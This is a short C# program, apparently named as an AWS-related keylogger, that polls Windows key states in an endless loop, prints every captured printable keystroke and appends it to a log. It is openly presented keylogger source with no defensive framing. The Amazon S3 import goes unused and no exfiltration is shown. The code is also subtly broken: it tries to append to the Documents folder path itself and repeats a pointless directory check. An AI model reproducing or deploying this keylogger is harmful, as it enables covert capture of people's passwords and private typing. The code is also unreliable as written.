using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Amazon.S3;
using Amazon.S3.Model;

namespace AWSConsoleKeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        static string keylog = "";
        static void Main(string[] args)
        {
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            }
            while (true)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    //32769 is for windows 10
                    if (keyState == 32769)
                    {
                        Console.WriteLine((char)i + " ");

                        using (StreamWriter sw = File.AppendText(filepath))
                        {
                            sw.Write((char)i + " ");
                        }
                    }
                }
            }
        }
    }
}


